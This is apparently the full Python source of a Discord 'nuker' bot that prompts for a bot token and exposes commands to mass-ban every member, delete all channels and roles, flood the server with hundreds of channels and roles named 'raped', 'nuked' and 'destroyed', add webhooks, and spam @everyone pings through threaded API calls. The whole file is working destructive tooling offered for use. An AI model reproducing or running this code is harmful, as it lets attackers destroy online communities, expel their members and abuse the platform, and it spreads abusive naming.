import requests
from colorama import init, Fore, Style, Back
import discord
from discord.ext import commands
import threading
import colorama
import random
import json
import time
import requests
import os
import sys
from discord import Webhook

os.system('cls & title Nuker Lone')
init()

Prefix = "!"

client = commands.Bot(command_prefix=Prefix, intents=discord.Intents.all())


TOKEN = input("[!] Token: ")
os.system('cls & title Nuker')
print(f'''



                                             
                                       @@@  @@@ @@@  @@@ @@@  @@@ @@@@@@@@ @@@@@@@  
                                       @@!@!@@@ @@!  @@@ @@!  !@@ @@!      @@!  @@@ 
                                       @!@@!!@! @!@  !@! @!@@!@!  @!!!:!   @!@!!@!  
                                       !!:  !!! !!:  !!! !!: :!!  !!:      !!: :!!  
                                       ::    :   :.:: :   :   ::: : :: ::   :   : : 
                                      
                                      
                                                                      {Fore.GREEN}Made by: {Fore.WHITE}Lone#6456
                                                                      Prefix = {Fore.GREEN}!
                      
                       {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}] {Fore.WHITE}!massban                               
                       {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}] {Fore.WHITE}!deleteAllChannels
                       {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}] {Fore.WHITE}!deleteAllRoles
                       {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}] {Fore.WHITE}!MassChannels
                       {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}] {Fore.WHITE}!MassRoles
                       {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}] {Fore.WHITE}!MassWebhooks
                       {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}] {Fore.RED}!MassPing
                       {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}] {Fore.GREEN}Coming Soon!
                       
                                             

''')
headers = {
    "Authorization":
    f"Bot {TOKEN}"
}


client.remove_command('help')




@client.command(aliases=['mb'])
async def massban(ctx):
    await ctx.message.delete()
    servr = ctx.guild.id

    def mass_ban(i):
        sessions = requests.Session()
        sessions.put(
            f"https://discord.com/api/v9/guilds/{servr}/bans/{i}",
            headers=headers
        )

    for i in range(5):
        for member in list(ctx.guild.members):
            threading.Thread(
                target=mass_ban,
                args=(member.id,)
            ).start()
            
            
@client.command(aliases=['dc', 'dac'])
async def deleteAllChannels(ctx):
    await ctx.message.delete()
    servr = ctx.guild.id
    channelel = ctx.guild.channels
    
  
    def channel_delete(i):
        sessions = requests.Session()
        sessions.delete(
            f"https://discord.com/api/v9/channels/{i}",
            headers=headers
        )

    for i in range(7):
        for channel in list(ctx.guild.channels):
            threading.Thread(
                target=channel_delete,
                args=(channel.id,)
            ).start()
            
        

@client.command(aliases=['dr', 'dar'])
async def deleteAllRoles(ctx):
    await ctx.message.delete()
    servr = ctx.guild.id
    channelel = ctx.guild.channels

    def role_delete(i):
        sessions = requests.Session()
        sessions.delete(
            f"https://discord.com/api/v9/guilds/{servr}/roles/{i}",
            headers=headers
        )

    for i in range(7):
        for role in list(ctx.guild.roles):
            threading.Thread(
                target=role_delete,
                args=(role.id,)
            ).start()
            
channel_names = ("raped", "nuked")
@client.command(aliases=['mc', 'mschan'])
async def MassChannels(ctx):
    await ctx.message.delete()
    guild = ctx.guild.id
    sessions = requests.Session()
    def create_channels(i):
        json = {
          "name": i
        }
        
        sessions.post(f"https://discord.com/api/v9/guilds/{guild}/channels", headers=headers, json=json)
        
    for i in range(450):
        threading.Thread(
            target=create_channels,
            args=(random.choice(channel_names), )
        ).start()


role_names = ("RAPED", "NUKED", "DESTROYED")
@client.command(aliases=['mr', 'msroles'])
async def MassRoles(ctx):
    await ctx.message.delete()
    guild = ctx.guild.id
    sessions = requests.Session()
    def create_channels(i):
        json = {
          "name": i
        }
        
        sessions.post(f"https://discord.com/api/v9/guilds/{guild}/roles", headers=headers, json=json)
        
    for i in range(100):
        threading.Thread(
            target=create_channels,
            args=(random.choice(role_names), )
        ).start()
        
web_names = ("RAPED", "NUKED", "DESTROYED")
@client.command(aliases=['mw', 'msweb'])
async def MassWebhooks(ctx):
    await ctx.message.delete()
    guild = ctx.guild.id
    for channel in list(ctx.guild.channels):
        if type(channel) == discord.TextChannel:
            await channel.create_webhook(name=random.choice(web_names))
            
random_mes = ("@everyone NUKED", "@everyone DO BETTER")            
@client.command()
async def MassPing(ctx):
    sessions = requests.Session()
    guild = ctx.guild
    
    def mass_ping(i):
        js = {
            "content": random.choice(random_mes),
            "tts": False
        
        }
        
        sessions.post(f"https://discord.com/api/v9/channels/{i}/messages", headers=headers, json=js)
        
    for i in range (200):
        for channel in list(ctx.guild.channels):
            threading.Thread(
                target=mass_ping,
                args=(channel.id, )
            
            ).start()

  
try:
    client.run(TOKEN)
except:
    os.system('cls && title error NukerV1')
    print(Fore.RED + "[!] Invalid Token")